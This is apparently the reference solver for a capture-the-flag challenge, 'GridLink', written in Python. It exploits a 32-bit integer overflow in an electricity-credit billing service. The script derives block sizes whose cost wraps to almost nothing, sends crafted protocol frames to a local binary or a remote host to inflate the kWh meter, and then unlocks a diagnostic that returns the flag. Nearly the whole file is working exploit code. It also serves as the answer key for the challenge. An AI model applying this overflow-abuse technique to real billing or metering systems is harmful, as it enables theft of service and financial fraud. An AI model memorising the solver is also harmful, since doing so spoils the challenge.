#!/usr/bin/env python3
"""
ZSCTF :: GridLink -- reference solver.

Intended path (pure billing-arithmetic abuse; no memory corruption):

  The retail path prices credit in a 64-bit field and is honest. The enterprise
  BLOCK path computes the rupee cost of `units` credits in a 32-bit accumulator,
  then credits the full 64-bit `units` to the kWh register. For a block whose
  `units * tariff_paise` wraps the 32-bit modulus back down to a few paise, the
  service bills almost nothing yet credits hundreds of millions of kWh. A handful
  of such blocks trips the factory register ceiling, and the diagnostic hands
  over the maintenance token.

  The service publishes `tariff_paise`, `wallet_paise`, `maint_threshold` and
  `max_block` in its connect banner, so the exact block sizes are computed, not
  guessed. Everything below is derived from those four numbers.

Run locally against the built binary:
    python solve.py --local ../challenge/gridlink
Run against a deployed instance:
    python solve.py --remote HOST PORT
"""
import sys
import struct
import socket
import subprocess
import argparse
import re

MOD32 = 1 << 32
MAGIC = b"GLNK"

OP_TOPUP, OP_STATUS, OP_ADJUST, OP_BLOCK, OP_DIAG = 1, 2, 3, 4, 5


def frame(opcode, body=b""):
    """Build one wire request: GLNK | op | flags | len(u16 le) | body."""
    assert len(body) <= 0xFFFF
    return MAGIC + struct.pack("<BBH", opcode, 0, len(body)) + body


def req_block(units):
    return frame(OP_BLOCK, struct.pack("<I", units & 0xFFFFFFFF))


def req_diag():
    return frame(OP_DIAG)


# -- transport abstractions --------------------------------------------------
class Proc:
    def __init__(self, path):
        self.p = subprocess.Popen([path], stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE)

    def readline(self):
        return self.p.stdout.readline()

    def send(self, data):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def close(self):
        try:
            self.p.stdin.close()
        except Exception:
            pass
        try:
            self.p.wait(timeout=5)
        except Exception:
            self.p.kill()


class Sock:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.f = self.s.makefile("rwb")

    def readline(self):
        return self.f.readline()

    def send(self, data):
        self.f.write(data)
        self.f.flush()

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def readline_str(io):
    return io.readline().decode("latin-1").rstrip("\r\n")


def read_banner(io):
    """Read banner lines until 'ready'; return config dict."""
    cfg = {}
    while True:
        ln = readline_str(io)
        if ln == "":
            raise RuntimeError("service closed during banner")
        if ln.startswith("config "):
            _, key, val = ln.split(None, 2)
            cfg[key] = int(val)
        elif ln.startswith("meter credits"):
            cfg["meter"] = int(ln.split()[-1])
        elif ln == "ready":
            break
    for need in ("tariff_paise", "wallet_paise", "maint_threshold", "max_block"):
        if need not in cfg:
            raise RuntimeError("banner missing %s" % need)
    return cfg


_METER = re.compile(r"meter=(-?\d+)")


def meter_of(line):
    m = _METER.search(line)
    return int(m.group(1)) if m else None


def best_block(tariff, wallet, max_block):
    """
    Largest `units <= max_block` whose 32-bit cost (units*tariff mod 2^32) is
    affordable (<= wallet). Maximises credit-per-request to minimise calls.
    """
    kmax = (max_block * tariff) // MOD32 + 2
    for k in range(kmax, 0, -1):
        units = -(-k * MOD32 // tariff)          # ceil(k * 2^32 / tariff)
        if units < 1 or units > max_block:
            continue
        cost = (units * tariff) % MOD32
        if cost <= wallet:
            return units, cost
    raise RuntimeError("no affordable wrapping block found (unexpected)")


def solve(io):
    cfg = read_banner(io)
    tariff = cfg["tariff_paise"]
    wallet = cfg["wallet_paise"]
    thresh = cfg["maint_threshold"]
    max_block = cfg["max_block"]

    units, cost = best_block(tariff, wallet, max_block)
    print("[*] tariff=%d paise  wallet=%d paise  threshold=%d kWh  max_block=%d"
          % (tariff, wallet, thresh, max_block))
    print("[*] crafted block: units=%d  real_price=%d paise  billed(32-bit)=%d paise"
          % (units, units * tariff, cost))

    meter = cfg.get("meter", 0)
    calls = 0
    while meter < thresh:
        io.send(req_block(units))
        resp = readline_str(io)
        if not resp.startswith("OK block"):
            raise RuntimeError("BLOCK rejected: %r" % resp)
        meter = meter_of(resp)
        calls += 1
        print("[+] block #%d -> meter=%d" % (calls, meter))
        if calls > 64:
            raise RuntimeError("too many calls; aborting")

    io.send(req_diag())
    l1 = readline_str(io)
    if l1 != "DIAG unlocked":
        raise RuntimeError("diagnostic not unlocked: %r" % l1)
    l2 = readline_str(io)
    if not l2.startswith("FLAG "):
        raise RuntimeError("no flag line: %r" % l2)
    return l2[5:]


def main():
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--local", metavar="BINARY")
    g.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"))
    args = ap.parse_args()

    io = Proc(args.local) if args.local else Sock(args.remote[0], int(args.remote[1]))
    try:
        flag = solve(io)
        print("[+] FLAG =", flag)
        return 0
    finally:
        io.close()


if __name__ == "__main__":
    sys.exit(main())
